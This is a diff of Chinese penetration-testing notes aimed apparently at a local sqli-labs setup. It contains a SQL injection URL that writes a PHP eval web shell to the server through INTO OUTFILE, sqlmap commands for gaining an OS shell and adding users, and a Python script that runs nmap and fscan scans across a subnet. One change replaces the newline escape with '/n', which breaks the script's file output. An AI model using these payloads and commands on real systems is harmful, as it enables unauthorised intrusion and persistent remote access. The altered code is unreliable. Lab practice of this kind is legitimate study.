@@ -37,7 +37,7 @@ hackbar test-->current path
 
 ```sql
 //sql注入
-1.http://192.168.71.45/sqli-labs-master/Less-1/?id=-1' union select 1,2,"<?php @eval($_POST['a']);?>" into outfile "C:\phpstudy_pro\WWW\a.php" --+
+1.http://192.168.71.45/sqli-labs-master/Less-1/?id=-1' union select 1,2,"<?php @eval($_POST['a']);?>" into outfile "C:/phpstudy_pro/WWW/a.php" --+
 
 2.使用sqlmap --> sqlmap -u "url" --os-shell --level 3  （执行系统命令，权限高的话可以net user /add）
 -----sqlmap --> sqlmap -u "url" --sql-shell --level 3 (执行sql语句，可以利用来写shell)
@@ -109,15 +109,15 @@ ips = [base_ip + str(i) for i in range(last_num, 255)]
 with open("C:/Users/24937/Desktop/ip.txt", "w") as f:
     for ip in ips:
         print(ip)
-        f.write(ip + "\n")
+        f.write(ip + "/n")
 print('写入成功!!!')
 #
 # print(subprocess.run("ipconfig", capture_output=True, encoding='gbk'))
 os.system("nmap -sV 192.168.71.0/24")
-os.system("fscan.exe -hf C:\\Users\\24937\\Desktop\\ip.txt -p 80,8080,22,3306,6379,3389,1433,445")
+os.system("fscan.exe -hf C://Users//24937//Desktop//ip.txt -p 80,8080,22,3306,6379,3389,1433,445")
 
-# os.system("D:\\naabu\\naabu.exe -host 192.168.71.21 -p 1-65535")
-# os.system("D:\\masscan\\masscan.exe --ports 1-65535 192.168.71.21")
+# os.system("D://naabu//naabu.exe -host 192.168.71.21 -p 1-65535")
+# os.system("D://masscan//masscan.exe --ports 1-65535 192.168.71.21")
 ```
 
 <img src="./assets/image-20240921102157340.png" alt="image-20240921102157340" style="zoom: 25%;" />
